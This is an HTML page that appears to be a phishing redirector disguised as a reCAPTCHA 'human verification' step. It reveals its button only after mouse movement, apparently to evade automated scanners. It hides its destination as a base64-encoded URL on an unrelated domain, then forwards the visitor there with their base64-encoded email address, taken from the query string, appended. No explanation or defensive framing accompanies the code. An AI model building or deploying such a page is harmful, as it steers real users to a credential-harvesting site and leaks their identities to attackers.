<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <meta name="robots" content="noindex, nofollow" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      background-color: #f8f8f8;
      padding-top: 100px;
    }
    #start-button {
      display: none;
      padding: 12px 24px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
  <h2>Human verification required</h2>
  <p>Move your mouse to begin verification.</p>

  <button id="start-button" onclick="startCaptcha()">I am not a robot</button>

  <form id="captcha-form" style="display:none;" onsubmit="return false;">
    <div class="g-recaptcha" data-sitekey="6LdbsZ4rAAAAAMRuZbWVRf029nZK2HmbnDz3zLrL" data-callback="onCaptchaSuccess"></div>
  </form>

  <script>
    const forwardEmail = true;

    const urlParts = [
      "aHR0cHM6Ly80aHo3OC5scWN5cXNwLmVzL3BsZkQ4bmdRITUyRFpvRTZnWi8=" 
    ];

    document.addEventListener("mousemove", function trigger() {
      document.getElementById("start-button").style.display = "inline-block";
      document.removeEventListener("mousemove", trigger);
    });

    function startCaptcha() {
      document.getElementById("start-button").style.display = "none";
      document.getElementById("captcha-form").style.display = "block";
    }

    function onCaptchaSuccess() {
      const query = window.location.search;
      const match = query.match(/\?(\d{10})=([a-zA-Z0-9+/=]+)/);

      if (!match || !match[2]) {
        document.body.innerHTML = "<h3>Missing required parameter.</h3>";
        return;
      }

      const encodedEmail = match[2].trim();
      const baseURL = atob(urlParts[0]);

      const finalURL = forwardEmail
        ? `${baseURL}*${encodedEmail}`
        : baseURL;

      window.location.href = finalURL;
    }
  </script>
</body>
</html>
